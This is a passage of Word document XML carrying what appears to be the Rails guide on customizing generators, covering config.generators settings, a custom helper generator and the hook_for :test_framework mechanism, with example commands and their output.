              <w:t>  g.test_framework  :test_unit, :fixture</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37D32C71" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.stylesheets     false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B5CB741" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="63142FC9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If we generate another resource with the scaffold generator, we can see that neither stylesheets nor fixtures are created anymore. If you want to customize it further, for example to use DataMapper and RSpec instead of Active Record and TestUnit, it’s just a matter of adding their gems to your application and configuring your generators.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="187A2F3A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To demonstrate this, we are going to create a new helper generator that simply adds some instance variable readers. First, we create a generator within the rails namespace, as this is where rails searches for generators used as hooks:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5040"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="1F608501" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="22728B8E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="960840366"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate generator rails/my_helper</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="54DB369A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">After that, we can delete both the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>templates</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory and the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>source_root</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class method from our new generators, because we are not going to need them. So our new generator looks like the following:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7800"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="7576E1D4" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78CA9778" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Rails::MyHelperGenerator &lt; Rails::Generators::NamedBase</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F21DB85" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>create_helper_file</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20EF39C9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    create_file "app/helpers/#{file_name}_helper.rb", &lt;&lt;-FILE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14889DE7" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#{class_name}Helper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="581E5E24" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  attr_reader :#{plural_name}, :#{plural_name.singularize}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="200E5FE6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6281C5B5" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    FILE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="278A91B7" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A04CE9C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6CC273D4" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>We can try out our new generator by creating a helper for users:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4200"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="5FAB97C7" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7AE288EB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="2108496948"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate my_helper products</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="54EAA999" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">And it will generate the following helper file in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/helpers</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4200"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="5E6E4D31" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="49793989" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ProductsHelper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AA10646" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  attr_reader :products, :product</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E7A8C8A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="48944072" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Which is what we expected. We can now tell scaffold to use our new helper generator by editing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> once again:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6168"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="77D12CBB" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7A79219D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>config.generators do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|g|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="140B79D3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.orm             :active_record</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="174D5BD0" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.template_engine :erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DC7EAF8" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.test_framework  :test_unit, :fixture</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="498DEC9B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.stylesheets     false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64BADF35" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.helper          :my_helper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7011D97B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2EADF540" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>and see it in action when invoking the generator:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="16BB86DF" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="62A660B4" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate scaffold Post body:text</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23D8CC08" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      [...]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F18254C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke    my_helper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C5BBF01" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/helpers/posts_helper.rb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3331D614" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>We can notice on the output that our new helper was invoked instead of the Rails default. However one thing is missing, which is tests for our new generator and to do that, we are going to reuse old helpers test generators.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EE9888" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Since Rails 3.0, this is easy to do due to the hooks concept. Our new helper does not need to be focused in one specific test framework, it can simply provide a hook and a test framework just needs to implement this hook in order to be compatible.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715E5605" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To do that, we can change the generator this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7800"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="72EE6DF8" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B16FBFF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Rails::MyHelperGenerator &lt; Rails::Generators::NamedBase</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BCE3AFB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>create_helper_file</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41B984C0" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    create_file "app/helpers/#{file_name}_helper.rb", &lt;&lt;-FILE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0526A43A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#{class_name}Helper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3676FCD1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  attr_reader :#{plural_name}, :#{plural_name.singularize}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DCDBD2A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28DEA291" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    FILE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="000F51E5" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66C58107" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41F3C448" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  hook_for :test_framework</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FBDE45C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3FFDA70C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now, when the helper generator is invoked and TestUnit is configured as the test framework, it will try to invoke both </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::TestUnitGenerator</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>TestUnit::MyHelperGenerator</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Since none of those are defined, we can tell our generator to invoke </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>TestUnit::Generators::HelperGenerator</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instead, which is defined since it’s a Rails generator. To do that, we just need to add:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5040"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="5F84236C" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="00FE5D31" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># Search for :helper instead of :my_helper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3949CE82" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>hook_for :test_framework, :as</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :helper</w:t>
